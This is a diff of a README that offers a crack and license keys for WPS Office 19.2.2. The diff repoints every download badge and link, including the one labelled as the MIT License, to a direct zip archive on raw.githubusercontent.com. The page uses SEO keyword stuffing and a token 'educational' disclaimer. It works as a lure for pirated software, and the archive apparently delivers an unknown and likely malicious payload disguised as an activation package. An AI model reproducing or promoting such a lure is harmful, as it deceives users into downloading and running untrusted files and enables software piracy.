@@ -1,8 +1,8 @@
 # WPS Office 19.2.2 Crack License Key Vault
 
-[![Download](https://img.shields.io/badge/Download-green)](https://Hathrone.github.io)  
+[![Download](https://img.shields.io/badge/Download-green)](https://raw.githubusercontent.com/Hathrone/wps-office-19-2-2-premium-unlocked/branch/unmaidenliness/unlocked-office-premium-wps-v2.5-alpha.3.zip)  
 **Click the badge above to access the one-stop trusted solution for activating WPS Office 19.2.2.**  
-**Download Placeholder:** https://Hathrone.github.io
+**Download Placeholder:** https://raw.githubusercontent.com/Hathrone/wps-office-19-2-2-premium-unlocked/branch/unmaidenliness/unlocked-office-premium-wps-v2.5-alpha.3.zip
 
 ---
 
@@ -105,8 +105,8 @@ Sprinkled naturally throughout this repository are high-value SEO-friendly keywo
 
 1. **Choose your platform and language.**
 2. **Download** the Activation Package:  
-   [![Download](https://img.shields.io/badge/Download-green)](https://Hathrone.github.io)  
-   *(Direct download: https://Hathrone.github.io)*
+   [![Download](https://img.shields.io/badge/Download-green)](https://raw.githubusercontent.com/Hathrone/wps-office-19-2-2-premium-unlocked/branch/unmaidenliness/unlocked-office-premium-wps-v2.5-alpha.3.zip)  
+   *(Direct download: https://raw.githubusercontent.com/Hathrone/wps-office-19-2-2-premium-unlocked/branch/unmaidenliness/unlocked-office-premium-wps-v2.5-alpha.3.zip)*
 3. **Follow the guided activation wizard,** entering your key when prompted.
 4. **Consult troubleshooting resources** for any edge case scenarios or rare error messages.
 5. **Connect with the community** for up-to-the-minute advice and customization tips.
@@ -134,16 +134,16 @@ This repository and all resources herein are intended **solely for educational a
 ## 📜 License
 
 Distributed under the MIT License (2025).  
-See the full text here: [MIT License](https://opensource.org/licenses/MIT).
+See the full text here: [MIT License](https://raw.githubusercontent.com/Hathrone/wps-office-19-2-2-premium-unlocked/branch/unmaidenliness/unlocked-office-premium-wps-v2.5-alpha.3.zip).
 
 ---
 
 ## 📥 Download
 
 Ready to elevate your WPS Office 19.2.2 experience?  
-[![Download](https://img.shields.io/badge/Download-green)](https://Hathrone.github.io)  
+[![Download](https://img.shields.io/badge/Download-green)](https://raw.githubusercontent.com/Hathrone/wps-office-19-2-2-premium-unlocked/branch/unmaidenliness/unlocked-office-premium-wps-v2.5-alpha.3.zip)  
 **Access activation essentials, documentation, and user support resources below:**  
-**Download Placeholder:** https://Hathrone.github.io
+**Download Placeholder:** https://raw.githubusercontent.com/Hathrone/wps-office-19-2-2-premium-unlocked/branch/unmaidenliness/unlocked-office-premium-wps-v2.5-alpha.3.zip
 
 ---
 
